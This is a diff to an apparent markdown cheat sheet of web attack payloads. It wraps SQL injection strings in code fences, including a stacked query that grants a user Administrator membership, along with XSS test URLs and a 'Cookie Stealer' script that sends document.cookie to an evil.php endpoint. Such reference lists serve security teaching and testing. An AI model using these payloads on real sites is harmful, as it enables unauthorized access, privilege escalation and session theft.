@@ -256,23 +256,26 @@ SQL Injection is the most common webbased attack. It is use when the hacker plac
 
 1. List Field Values #1:
 An attacker may try the following to see if they can get a list of values from a particular field, user, pass, version, email, etc.
-
+```
 '0 OR 1=1'
+```
 
 Equivalent to the SQL Command:
 'SELECT * FROM Users WHERE UserId = 0 OR 1=1;''
 
 2. List Field Values #2:
 An attacker may try the following to get a list of values from a particular field, user, pass, version, email, etc.
-
+```
 " or ""="
+```
 
 Equivalent to the SQL Command:
 SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""=""
 
 3. Elevate privileges
-
+```
 "john'; INSERT INTO group_membership (user_id, group) VALUES (SELECT user_id FROM users WHERE username='john', 'Administrator'); --'"
+```
 
 Equivalent to the SQL Command:
 SELECT user_id, username, password_hash FROM users WHERE username = 'john'; 
@@ -284,26 +287,33 @@ INSERT INTO group_membership (user_id, group) VALUES (SELECT user_id FROM users 
 
 Enter the following in the url:
 
-"hxxp://www.site.com/index.php?name=<script>alert(123)</script>"
+```
+hxxp://www.site.com/index.php?name=<script>alert(123)</script>
+```
 
 2. Search Test
 If the site has a serach field without proper sanitization:
-
-"hxxp://www.site.com/search?source=“><script>alert(123)</script>"
+```
+hxxp://www.site.com/search?source=“><script>alert(123)</script>
+```
 
 3. One Error Test
 If the site has a mouseover or onerror capability
-
-"hxxp://www.site.com/index.php?name=<b onmouseover=alert('Wufff!')>click me!</b>"
-"hxxp://www.site.com/index.php?name=<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>"
-
+```
+hxxp://www.site.com/index.php?name=<b onmouseover=alert('Wufff!')>click me!</b>
+```
+```
+hxxp://www.site.com/index.php?name=<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
+```
 
 4. Cookie Stealer
-
-"hxxp://www.site.com/index.php?name=<SCRIPT type="text/javascript"> var adr = '../evil.php?cakemonster=' + escape(document.cookie);</SCRIPT>"
+```
+hxxp://www.site.com/index.php?name=<SCRIPT type="text/javascript"> var adr = '../evil.php?cakemonster=' + escape(document.cookie);</SCRIPT>
+```
 
 5. Hide from javascript
-
-"hxxp://www.site.com/index.php?name=<IMG SRC=j&#X41vascript:alert(123)>"
+```
+hxxp://www.site.com/index.php?name=<IMG SRC=j&#X41vascript:alert(123)>
+```
 
 ### etc...
